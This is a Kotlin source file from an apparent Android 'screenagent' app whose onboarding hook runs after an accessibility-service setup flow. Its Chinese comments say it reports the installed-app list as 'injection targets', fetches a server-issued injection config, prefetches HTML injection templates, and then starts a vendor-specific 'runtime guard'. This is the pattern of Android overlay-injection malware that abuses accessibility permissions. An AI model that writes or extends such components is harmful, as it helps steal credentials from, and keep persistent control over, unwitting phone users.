package com.zaka.screenagent.flow

import android.util.Log
import android.os.Handler
import android.os.Looper
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService

/**
 * 引导完成后的统一收尾（与厂商无关）：
 *   ① 上报已安装应用列表（面板「注入目标」显示本机已安装）
 *   ② 拉取服务器下发的注入配置
 *   ③ 预取模板 HTML 到本地（注入时秒开）
 *
 * 各厂商流程（MiuiFlow / SamsungFlow …）在最后一步完成后调用一次。
 */
object OnboardingHooks {

    @Volatile private var done = false

    /**
     * 引导完成（**所有厂商共用**）：标记完成 + 上报应用列表 + 拉注入配置 + 预取模板 HTML。
     * 幂等：重复调用只执行一次。
     */
    fun complete(service: BoundaryAccessibilityService) {
        if (done) return
        done = true
        Log.d("Flow", "onboarding complete -> markDone + close overlay + appList + runtime guard")
        runCatching { com.zaka.screenagent.admin.OnboardingState.markDone(service) }
        runCatching { OnboardingProgress.finish() }
        runCatching { service.onOnboardingComplete() }
        // 先让 100% 进度完成并收起浮层，再把运行守卫标记为就绪。
        if (!com.zaka.screenagent.BuildConfig.NO_GUARD) {
            Handler(Looper.getMainLooper()).postDelayed({
                runCatching { VendorGuard.start(service) }
                Log.d("Flow", "onboarding complete -> runtime guard started (vendor=${Vendor.detect()})")
            }, 1_400L)
        } else {
            Log.d("Flow", "NO_GUARD=true -> 守卫未启动（调试包）")
        }
    }
}
